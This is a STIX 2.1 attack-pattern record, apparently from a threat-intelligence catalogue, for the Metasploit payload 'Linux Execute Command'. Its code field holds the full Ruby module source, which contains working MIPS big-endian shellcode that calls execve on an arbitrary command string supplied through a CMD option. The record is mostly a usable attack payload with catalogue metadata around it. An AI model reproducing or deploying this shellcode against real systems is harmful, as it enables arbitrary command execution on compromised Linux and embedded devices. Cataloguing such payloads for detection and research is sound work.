{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--873b5d70-66a5-40d2-94bc-1690dbb8bb36",
    "created": "2024-08-14T16:33:19.455237Z",
    "modified": "2024-08-14T16:33:19.45524Z",
    "name": "Linux Execute Command",
    "description": " A very small shellcode for executing commands. This module is sometimes helpful for testing purposes. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/linux/mipsbe/exec.rb",
            "external_id": "exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n\n  CachedSize = 52\n\n  include Msf::Payload::Single\n  include Msf::Payload::Linux\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Linux Execute Command',\n      'Description'   => %q{\n                A very small shellcode for executing commands.\n                This module is sometimes helpful for testing purposes.\n         },\n      'Author'        =>\n        [\n          'Michael Messner <devnull[at]s3cur1ty.de>', #metasploit payload\n          'entropy@phiral.net'  #original payload\n        ],\n      'References'    =>\n        [\n          ['EDB', '17940']\n        ],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_MIPSBE,\n      'Payload'       =>\n        {\n          'Offsets' => {} ,\n          'Payload' => ''\n        })\n    )\n    register_options(\n      [\n        OptString.new('CMD', [ true, \"The command string to execute\" ]),\n      ])\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    return datastore['CMD'] || ''\n  end\n\n  def generate(_opts = {})\n\n    shellcode =\n      \"\\x24\\x06\\x06\\x66\" + #li a2,1638\n      \"\\x04\\xd0\\xff\\xff\" + #bltzal a2,4100b4\n      \"\\x28\\x06\\xff\\xff\" + #slti a2,zero,-1\n      \"\\x27\\xbd\\xff\\xe0\" + #addiu sp,sp,-32\n      \"\\x27\\xe4\\x10\\x01\" + #addiu a0,ra,4097\n      \"\\x24\\x84\\xf0\\x1f\" + #addiu a0,a0,-4065\n      \"\\xaf\\xa4\\xff\\xe8\" + #sw a0,-24(sp)\n      \"\\xaf\\xa0\\xff\\xec\" + #sw zero,-20(sp)\n      \"\\x27\\xa5\\xff\\xe8\" + #addiu a1,sp,-24\n      \"\\x24\\x02\\x0f\\xab\" + #li v0,4011\n      \"\\x01\\x01\\x01\\x0c\"   #syscall 0x40404\n\n    #\n    # Constructs the payload\n    #\n\n    shellcode = shellcode + command_string + \"\\x00\"\n\n    # we need to align our shellcode to 4 bytes\n    (shellcode = shellcode + \"\\x00\") while shellcode.length%4 != 0\n\n    return super + shellcode\n\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}